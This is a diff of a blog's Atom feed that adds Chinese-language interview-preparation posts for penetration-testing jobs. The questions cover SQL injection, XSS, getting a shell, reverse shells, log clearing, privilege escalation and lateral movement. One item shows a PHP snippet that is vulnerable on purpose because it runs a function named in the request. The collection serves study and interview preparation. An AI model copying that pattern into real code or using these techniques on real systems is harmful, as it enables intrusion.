@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2023-08-30T16:14:27.620Z</updated>
+  <updated>2023-09-04T09:04:01.235Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,232 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>面试准备之web漏洞篇</title>
+    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8Bweb%E6%BC%8F%E6%B4%9E%E7%AF%87/"/>
+    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8Bweb%E6%BC%8F%E6%B4%9E%E7%AF%87/</id>
+    <published>2023-09-02T16:00:00.000Z</published>
+    <updated>2023-09-04T09:04:01.235Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>可以不用，但不能没有。</p><span id="more"></span><h1 id="SQL注入与其它注入"><a href="#SQL注入与其它注入" class="headerlink" title="SQL注入与其它注入"></a>SQL注入与其它注入</h1><ol><li><p>如何判断sql注入，有哪些方法？</p></li><li><p>如何判断sql注入漏洞成因？如何防范？注入方式有哪些？除了数据库数据，利用方式还有哪些？</p></li><li><p>为什么有的时候没有错误回显？</p></li><li><p>宽字节注入原理？如何利用宽字节注入漏洞？payload如何构造？</p></li><li><p>mysql的网站注入，5.0以上与5.0以下有什么区别？</p></li><li><p>mysql的用户名密码是存放在哪张表里？mysql密码采用哪种加密方式？</p></li><li><p>mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？</p></li><li><p>SQL头注入点</p></li><li><p>mysql写shell有几种方法</p></li><li><p>如何突破注入时字符被转义？</p></li><li><p>注入时可以不用 and 或 or 或 xor，直接order by开始注入吗？</p></li><li><p>sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由。<br>A. demo.jsp?id&#x3D;2+1<br>B. demo.jsp?id&#x3D;2-1</p></li><li><p>以下链接存在sql注入漏洞，对于这个变形注入，你有什么思路？</p></li><li><p>sql注入的几种类型？</p></li><li><p>报错注入函数有哪些？10个</p></li><li><p>延时注入如何来判断？</p></li><li><p>盲注和延时注入的共同点？</p></li><li><p>sql注入写文件都有哪些函数？</p></li><li><p>sql注入防护方法？</p></li><li><p>注入有防护怎么办？</p></li><li><p>有没有写过sqlmap tamper？</p></li><li><p>为什么参数化查询可以防止SQL注入？</p></li><li><p>盲注是什么？怎么盲注？</p></li><li><p>宽字节注入原理以及根本原因</p></li><li><p>sql如何写shell&#x2F;单引被过滤怎么办？</p></li><li><p>sql注入点，空表如何利用</p></li><li><p>怎样判断是否存在注入</p></li><li><p>sql注入无回显怎么办？</p></li><li><p>延时注入除了sleep的其它姿势(mysql)</p></li><li><p>DNSlog原理</p></li><li><p>sql注入，写shell的语句，除了into outfile还有什么MySQL的特性可以getshell</p></li><li><p>redis的利用，如何shell，相关命令</p></li><li><p>sql注入原理，及常用payload（手写-爆表名）</p></li><li><p>sql注入空格不能使用如何绕过？</p></li><li><p>sql注入防御，延伸预处理不能预防哪些注入？</p></li><li><p>攻击redis的方式（手写payload）</p></li><li><p>SQL注入写shell（MySQL &amp; mssql &amp; oracle）</p></li><li><p>SQL注入后利用</p></li><li><p>redis的利用</p></li><li><p>常见的sql注入类型有哪些？并写出sqlmap检测sql注入的命令？sqlmap api怎么使用？</p></li><li><p>针对sql注入，写出你所知道的bypass waf的可能方式</p></li><li><p>sql注入漏洞如何修复？</p></li><li><p>数据库预处理怎么突破？</p></li><li><p>sql注入如何拿getshell</p></li><li><p>sqlmap怎么跑post请求</p></li><li><p>sql注入怎么拿到最高权限？</p></li><li><p>怎么利用sql注入来读取文件</p></li><li><p>注入攻击原理是什么？如何找注入点？如何判断注入点？</p></li><li><p>注入分为几类，提交方式是什么？</p></li><li><p>注入攻击一般所支持的类型有哪些？</p></li><li><p>sql注入对服务器文件读写操作需要哪些条件？</p></li><li><p>分别说出sqlmap -u -r -v -p  –level –risk –tables –columns -T –tamper参数的含义</p></li><li><p>注入漏洞防范方法</p></li><li><p>MySQL数据库的右向偏移</p></li><li><p>sqlserver利用思路</p></li><li><p>偏移注入</p></li><li><p>说说sql注入手工怎么爆出所有库名字</p></li><li><p>数据库表名test，字段名user，password写出查询语句。</p></li><li><p>是否有写过tamper</p></li><li><p>如何彻底杜绝SQL注入？</p></li><li><p>SQL注入，如果注入点在union或order by之后，怎么办？</p></li></ol><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><ol><li><p>文件上传有哪些防护方式？</p></li><li><p>文件上传白名单利用</p></li><li><p>文件上传点，黑名单限制，如何利用</p></li><li><p>文件上传怎么绕过</p></li><li><p>任意文件上传漏洞分几类，说出每类突破方法</p></li></ol><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><ol><li><p>XSS能用来做什么？</p></li><li><p>XSS的三种类型，防御方法。</p></li><li><p>存储型XSS的原理和危害</p></li><li><p>你怎么理解XSS攻击？</p></li><li><p>如何快速发现XSS位置</p></li><li><p>DOM XSS 原理&#x2F;防范</p></li><li><p>DOM型XSS与反射型XSS区别？</p></li><li><p>如果SRC上报了一个XSS漏洞，payload已经写入页面，但未给出具体位置，如何快速介入？ </p></li><li><p>XSS Worm 原理</p></li><li><p>有没有用过xss平台？</p></li><li><p>xss如何执行代码</p></li><li><p>xss常用哪些标签？</p></li><li><p>xss如何盗取cookie</p></li><li><p>xss有cookie一定可以无用户名密码登录吗？</p></li><li><p>XSS除了获取cookie，还有别的用处吗?</p></li><li><p>xss的危害，可能存在的地方？</p></li><li><p>xss漏洞测试方法</p></li><li><p>xss如何绕过安全防范</p></li></ol><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><ol><li><p>php的LFI，本地包含漏洞原理是什么？写一段带有漏洞的代码，手工的话如何发掘？如果无本地报错回显，如何遍历文件？</p></li><li><p>PHP和Java的文件包含区别</p></li><li><p>文件包含以及变量覆盖</p></li><li><p>文件包含漏洞攻击原理及分类</p></li><li><p>如何快速挖掘包含漏洞</p></li><li><p>包含漏洞具体能做什么，怎么绕过？</p></li></ol><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><ol><li><p>CSRF如何不带referer访问</p></li><li><p>CSRF成因及防御措施；如果不用token如何做防御？</p></li><li><p>CSRF有何危害？</p></li><li><p>如何防止CSRF？</p></li><li><p>CSRF的原理及防御</p></li><li><p>一种特殊的CSRF场景：后端只解析json格式的时候如何利用CSRF（非更改Content-Type）</p></li><li><p>SameSite</p></li><li><p>csrf攻击原理是什么，一般用什么工具进行检测</p></li></ol><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><ol><li><p>SSRF漏洞的成因 防御 绕过</p></li><li><p>介绍SSRF漏洞，如何深入利用？如何探测非HTTP协议？如何防范？</p></li><li><p>SSRF利用点</p></li><li><p>ssrf的原理即后利用，怎么执行命令，常搭配使用的协议。</p></li><li><p>ssrf漏洞攻击原理，用途</p></li><li><p>说说如何挖掘ssrf漏洞</p></li></ol><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><ol><li><p>Java反序列化基础</p></li><li><p>Java反序列化有哪些CC链是有回显的？</p></li><li><p>Java反序列化相关的协议？</p></li><li><p>Fastjson反序列化及如何修复？</p></li><li><p>Java反序列化的原理</p></li><li><p>讲讲yso的链</p></li><li><p>shiro反序列化原理</p></li><li><p>反序列化原理</p></li></ol><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><ol><li>命令注入有哪些</li></ol><h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1><ol><li><p>CRLF注入原理。</p></li><li><p>如何绕过CDN获取目标网站真实IP？</p></li><li><p>列举你所知道的所有开源组件高危漏洞（10个以上）</p></li><li><p>服务器为IIS+PHP+MySQL，发现root权限注入漏洞，讲讲你的渗透思路。</p></li><li><p>下面这段代码存在漏洞吗？如果存在请说出存在什么漏洞并利用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.exp.com/1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$s_func</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;s_func&#x27;</span>];</span><br><span class="line"><span class="variable">$info</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>];</span><br><span class="line"><span class="variable">$s_func</span>(<span class="variable">$info</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>说出至少三种业务逻辑漏洞，以及修复方式？</p></li><li><p>DNSRebinding</p></li><li><p>登录框攻击面</p></li><li><p>getshell的姿势</p></li><li><p>DNS重绑定，利用</p></li><li><p>disable function bypass</p></li><li><p>写出你知道的逻辑漏洞</p></li><li><p>简述XXE的基本原理，以及如何去检测或判断blind XXE的存在</p></li><li><p>ARP攻击的原理(讲出具体流程)，如何发现并防御ARP攻击</p></li><li><p>SSL Strip（SSP）攻击到底是什么？</p></li><li><p>中间人攻击–ARP欺骗原理、实战及防御</p></li><li><p>会话劫持原理</p></li><li><p>CC攻击</p></li><li><p>添加时间戳防止重放攻击</p></li><li><p>https中间人攻击与证书校验</p></li><li><p>越权以及逻辑漏洞问题</p></li><li><p>验证码绕过有哪些方法？</p></li><li><p>分别说出iis，apache，nginx解析漏洞原理</p></li><li><p>任意下载漏洞攻击原理及测试方法</p></li><li><p>xxe漏洞攻击原理是什么？如何找xxe漏洞及攻击方法</p></li><li><p>xxe攻击在无回显的时候是怎么突破的？</p></li><li><p>如何防范xxe漏洞？</p></li><li><p>越权问题有哪些？实战</p></li><li><p>URL跳转漏洞</p></li><li><p>ARP欺骗的方法有哪些？说说原理</p></li></ol><h1 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h1><ol><li><p>如果遇到waf的情况如何进行sql注入&#x2F;上传webshell怎么做？请写出曾经绕过WAF的经过。</p></li><li><p>拿到一个待测的站，首先应该做什么？</p></li><li><p>判断出网站的CMS对渗透有什么意义？</p></li><li><p>一个成熟并且相对安全的CMS，渗透时扫目录的意义？</p></li><li><p>在某后台新闻编辑界面看到编辑器，应该先做什么？</p></li><li><p>拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？</p></li><li><p>注入漏洞只能查账号密码？</p></li><li><p>安全狗会追踪变量，从而发现是一句话木马吗？</p></li><li><p>.access扫出后缀为asp的数据库文件，访问乱码，如何实现到本地利用？</p></li><li><p>如何利用这个防注入系统拿shell？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">某个防注入系统，在注入时会提示：</span><br><span class="line">系统检测到你有非法注入的行为。</span><br><span class="line">已记录您的IP:xxx.xxx.xx.xx</span><br><span class="line">时间:yy:mm:dd</span><br><span class="line">提交页面: test.asp?id=15</span><br><span class="line">提交内容: and 1=1</span><br></pre></td></tr></table></figure></li><li><p>上传大马后访问乱码时，有哪些解决办法？</p></li><li><p>审查上传点的元素有什么意义？</p></li><li><p>目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？</p></li><li><p>以下条件有什么思路？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">目标站发现某txt的下载地址为：</span><br><span class="line">http://www.test.com/down/down.php?file=/upwdown/1.txt</span><br></pre></td></tr></table></figure></li><li><p>甲给你一个目标站，并且告诉你根目录下存在&#x2F;abc&#x2F;目录，并且此目录下存在编辑器和admin目录。请问你的想法是？</p></li><li><p>在有shell的情况下，如何使用xss实现对目标站的长久控制？</p></li><li><p>发现 demo.jsp?uid&#x3D;110 注入点，你有哪几种思路获取webshell，哪种是优选？</p></li><li><p>CSRF和XSS和XXE有什么区别，以及修复方式？</p></li><li><p>CSRF、SSRF和重放攻击有什么区别？</p></li><li><p>XSS、CSRF、CRLF比较容易弄混，说说三者的原理，防御方法。</p></li><li><p>owasp漏洞都有哪些？</p></li><li><p>渗透测试中常见的端口？</p></li><li><p>网站渗透流程</p></li><li><p>发现一个大范围影响的新漏洞，如何快速排查公司资产？</p></li><li><p>shiro反序列化</p></li><li><p>怎样对一个站去挖nday</p></li><li><p>跟过哪些nday，怎样一个思路</p></li><li><p>挖到过0day吗</p></li><li><p>代码审计</p></li><li><p>app渗透经历</p></li><li><p>redis利用姿势及环境差异</p></li><li><p>fastjson回显</p></li><li><p>jndi注入及原理</p></li><li><p>Java回显</p></li><li><p>泛微oa xstream的回显(jdk1.8和jdk1.7的差异)</p></li><li><p>shiro限制payload长度</p></li><li><p>Java回显的通用思路以及不同版本jdk的差异</p></li><li><p>owasp top10 漏洞</p></li><li><p>Rootkit是什么意思</p></li><li><p>手工查找后门木马的小技巧</p></li><li><p>常见web安全漏洞</p></li><li><p>永恒之蓝的漏洞原理是什么？怎么做到的？</p></li><li><p>针对PHP的弱类型，有哪些漏洞？</p></li><li><p>代码审计方面，有过对大型cms的审计吗？发现过哪些漏洞？</p></li><li><p>针对PHP的语言特点，说几个常见漏洞？</p></li><li></li></ol><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol><li><p><a href="https://docs.qq.com/doc/DSlByWEZoaWx4U3la">2022渗透测试面试问题搜集</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/511394956">干货 | 80篇+网络安全面试经验帖(第25篇还没看)</a></p></li><li><p><a href="https://blog.51cto.com/u_15474183/5535532">2023级网络安全岗面试题及面试经验分享</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/566448154">2023届网络安全岗秋招面试题及面试经验分享</a></p></li></ol>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;可以不用，但不能没有。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
+    
+    <category term="web漏洞" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/web%E6%BC%8F%E6%B4%9E/"/>
+    
+    
+    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>面试准备之密码学篇</title>
+    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AF%87/"/>
+    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AF%87/</id>
+    <published>2023-09-02T16:00:00.000Z</published>
+    <updated>2023-09-04T08:21:33.470Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>巧妙运用，出神入化。</p><span id="more"></span><h1 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h1><ol><li><p>常见加密方式</p></li><li><p>AES&#x2F;DES的具体工作步骤</p></li><li><p>RSA算法</p></li><li><p>如何生成一个安全的随机数？</p></li><li><p>在</p></li></ol>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;巧妙运用，出神入化。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
+    
+    <category term="密码学" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
+    
+    
+    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>面试准备之工具篇</title>
+    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/"/>
+    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/</id>
+    <published>2023-09-02T16:00:00.000Z</published>
+    <updated>2023-09-04T08:50:29.796Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>工具是兵器，知识是使用方法。</p><span id="more"></span><h1 id="发散提问"><a href="#发散提问" class="headerlink" title="发散提问"></a>发散提问</h1><ol><li><p>你平时使用哪些工具？以及对应工具的特点？</p></li><li><p>使用什么工具来判断系统是否存在后门？</p></li></ol><h1 id="网络工具"><a href="#网络工具" class="headerlink" title="网络工具"></a>网络工具</h1><ol><li>有哪些反向代理的工具？</li></ol><h1 id="渗透测试工具"><a href="#渗透测试工具" class="headerlink" title="渗透测试工具"></a>渗透测试工具</h1><ol><li><p>sqlmap，怎么对一个注入点注入？</p></li><li><p>nmap，扫描的几种方式？</p></li><li><p>用什么扫描端口，目录？</p></li><li><p>子域名枚举用过哪些工具，原理是什么，如果出现了任意子域名都返回200是什么原因？</p></li><li><p>后台扫描用什么工具？</p></li><li><p>御剑有自己的包吗？</p></li><li><p>burp会哪些模块？</p></li><li><p>如果不能用awvs和appscan还能怎么办？</p></li><li><p>msf用过吗</p></li><li><p>msf的木马你知道吗？免杀是怎么做的？</p></li><li><p>内网提权方面 土豆知道原理吗？</p></li><li><p>工作中用过哪些扫描器，这些扫描器都有哪些优缺点？</p></li><li><p>burp如何破解md5加密密码或base64加密密码？</p></li><li><p>kali上，最常用的哪几个工具？</p></li></ol>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;工具是兵器，知识是使用方法。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
+    
+    <category term="工具" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/%E5%B7%A5%E5%85%B7/"/>
+    
+    
+    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>面试准备之流量篇</title>
+    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E6%B5%81%E9%87%8F%E7%AF%87/"/>
+    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E6%B5%81%E9%87%8F%E7%AF%87/</id>
+    <published>2023-09-02T16:00:00.000Z</published>
+    <updated>2023-09-03T09:15:15.263Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>监控流量，就知道方向。</p><span id="more"></span><h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><ol><li>wireshark简单的过滤规则</li></ol><h1 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h1><ol><li>简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。</li></ol>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;监控流量，就知道方向。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
+    
+    <category term="流量" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/%E6%B5%81%E9%87%8F/"/>
+    
+    
+    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>面试准备之系统篇</title>
+    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E7%B3%BB%E7%BB%9F%E7%AF%87/"/>
+    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E7%B3%BB%E7%BB%9F%E7%AF%87/</id>
+    <published>2023-09-02T16:00:00.000Z</published>
+    <updated>2023-09-04T09:02:37.775Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>了解系统，才能更好攻击与防御。</p><span id="more"></span><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><ol><li><p>CMD命令行如何查询远程终端开放的端口。</p></li><li><p>Windows认证协议</p></li><li><p>Windows怎么提权</p></li></ol><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><ol><li><p>Linux服务器的安全运维操作有哪些？如何保护SSH？</p></li><li><p>入侵Linux服务器后需要清除哪些日志？</p></li><li><p>Linux提权的姿势</p></li><li><p>Linux下有哪些文件进行渗透时比较关注的，以及文件权限问题</p></li><li><p>dirty cow的时间及其修复版本（哪年后无法使用）</p></li><li><p>列举Linux反弹shell的一些方法</p></li><li><p>Linux系统中etc&#x2F;password和&#x2F;shadow文件的区别</p></li><li><p>Linux如何查看当前权限</p></li><li><p>对Linux了解吗？Linux内核漏洞有没有分析过？</p></li><li><p>你说你对堆栈溢出有了解，那玩过pwn吗？</p></li><li><p>如果对方开启了ALSR和DEP，要如何绕过？</p></li></ol><h1 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h1><ol><li><p>常见web开发Java框架</p></li><li><p>Java哪些框架，审过哪些框架，它们常出现的问题是什么？</p></li><li><p>python的web框架（flask&#x2F;django）</p></li><li><p>了解struts框架吗？说一说</p></li></ol><h1 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h1><ol><li><p>说说常见的中间件解析漏洞利用方式。</p></li><li><p>目前已知哪些版本的容器有解析漏洞，具体举例。</p></li><li><p>常见的中间件</p></li><li><p>中间件有哪些已知漏洞</p></li></ol><h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><ol><li><p>请写出MySQL5数据库中查询库’helloworld’中’user’表所有列名的语句。</p></li><li><p>udf提权</p></li><li><p>为何一个mysql数据库的站，只有一个80端口开放？</p></li><li><p>3389无法连接的几种情况</p></li><li><p>MySQL两种提权方式</p></li><li><p>Mongodb, redis, websphere, rsync服务简介和默认运行端口</p></li><li><p>MySQL中like查询会非常缓慢，如何进行优化？</p></li><li><p>Oracle, mysql, sqlserver默认端口</p></li><li><p>怎么通过数据库获取shell</p></li><li><p>数据库的提权有接触过吗？</p></li><li><p>mssql的提权你能说一下吗？</p></li><li><p>怎么分辨数据库类型？</p></li><li><p>mysql数据库账号和密码存放在哪个库和表里面？</p></li><li><p>分别写出MySQL及mssql数据库写入webshell的方法</p></li></ol><h1 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h1><ol><li><p>Windows、Linux、数据库的加固降权思路。</p></li><li><p>谈一谈Windows系统与Linux系统提权的思路？</p></li><li><p>反弹shell的常用命令？一般常反弹哪一种shell？为什么？</p></li><li><p>如果一台服务器被入侵后，如何做应急响应？</p></li><li><p>webshell的检测有哪些方法？</p></li><li><p>metasploit打开反向监听的命令</p></li><li><p>应急响应的步骤</p></li><li><p>怎么查找域控</p></li><li><p>如何手工快速判断目标站是Windows还是Linux服务器？</p></li><li><p>提权时选择可读写目录，为何尽量不用带空格的目录？</p></li><li><p>某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？</p></li><li><p>后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？</p></li><li><p>目标站无防护，上传文件可正常访问，上传脚本格式访问则403，什么原因？</p></li><li><p>审查元素得知网站所使用的防护软件，你觉得是怎样做到的？</p></li><li><p>在win2003服务器中建立一个 .zhongzi文件夹用意何为？</p></li><li><p>如何拿一个网站的webshell？</p></li><li><p>为什么aspx木马权限比sap大？</p></li><li><p>如何绕过waf？</p></li><li><p>如何向服务器写入webshell？</p></li><li><p>ddos如何防护</p></li><li><p>有没有抓过包，会不会写wireshark过滤规则？</p></li><li><p>清理日志要清理哪些？</p></li><li><p>查看当前端口连接的命令有哪些？ <code>netstat</code> 和 <code>ss</code> 命令的区别和优缺点</p></li><li><p>判断域控的几种方式</p></li><li><p>工作组横向</p></li><li><p>域内横向</p></li><li><p>白银票据黄金票据</p></li><li><p>判断是否在域内</p></li><li><p>hash传递原理</p></li><li><p>权限维持</p></li><li><p>横向移动的各种姿势和原理</p></li><li><p>凭证获取(姿势&#x2F;常用&#x2F;原理&#x2F;对抗)</p></li><li><p>如何对抗杀软加后门用户</p></li><li><p>chrome dump密码的原理，如果让你写个工具，思路是什么？（或者别人工具的实现原理）</p></li><li><p>PTH哈希传递</p></li><li><p>DCsync原理，DCsync是哪个协议？</p></li><li><p>有台Windows域内机器，如何打域控？</p></li><li><p>webshell 提权（低权限到高权限）</p></li><li><p>已经拿到webshell，说说你的内网思路</p></li><li><p>不允许扫描，如何横向</p></li><li><p>存在杀软，不允许exe落地，怎么办</p></li><li><p>常用的提权姿势</p></li><li><p>内网代理（详细问了frp）</p></li><li><p>内网如何反弹shell，反弹的shell流量如何屏蔽</p></li><li><p>除了TCP&#x2F;IP协议，如何将内网数据传递出来（内网环境有着严格防御与审查）</p></li><li><p>有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网进行其它探测？</p></li><li><p>主机疑似遭到入侵，要看哪里的日志？</p></li><li><p>DDOS有哪些？CC攻击是什么，区别是什么，什么协议</p></li><li><p>land攻击</p></li><li><p>绕过waf常用方法</p></li><li><p>信息收集都收集哪些信息</p></li><li><p>获取shell之后，你是怎么提权的？</p></li><li><p>进入到内网之后，怎么去维持权限？</p></li><li><p>讲一下黄金票据</p></li><li><p>讲一下APP渗透</p></li><li><p>如果抓不到包，是因为什么</p></li><li><p>了解APT</p></li><li><p>怎么测内网，怎么访问敏感文件</p></li><li><p>写shell需要什么权限吗？你怎么判断存在写入权限？如果没有写入权限，还能有什么办法吗？</p></li><li><p>怎么获得绝对路径呢？没有报错呢？不能读取文件呢？</p></li><li><p>怎么找到域控机</p></li><li><p>webshell你会利用哪些办法来绕过？</p></li><li><p>不用工具的前提下，如何搜集子域名？</p></li><li><p>渗透测试过程中如何信息收集，说一下渗透测试信息收集的办法？</p></li><li><p>在渗透过程中常用的编码有哪些？</p></li><li><p>渗透测试过程中如何判断对方操作系统是什么系统？</p></li><li><p>你是怎么知道对方网站使用了哪些常用cms系统搭建的（指纹信息是什么）</p></li><li><p>如何寻找网址物理路径？</p></li><li><p>如何创建一个用户并且提权</p></li><li><p>谷歌排行第一的CMS有1000个旁站，问怎么入侵</p></li><li><p>使用谷歌语法查询指定域名的子域名，并且搜索他的后台登录</p></li><li><p>对没有挂到dns上的网站如何进行入侵？</p></li><li><p>端口扫描时，都关注哪些端口，分别代表什么？</p></li></ol>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;了解系统，才能更好攻击与防御。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
+    
+    <category term="系统" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/%E7%B3%BB%E7%BB%9F/"/>
+    
+    
+    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>面试准备之自身方面篇</title>
+    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E8%87%AA%E8%BA%AB%E6%96%B9%E9%9D%A2%E7%AF%87/"/>
+    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E8%87%AA%E8%BA%AB%E6%96%B9%E9%9D%A2%E7%AF%87/</id>
+    <published>2023-09-02T16:00:00.000Z</published>
+    <updated>2023-09-04T08:50:21.671Z</updated>
+    
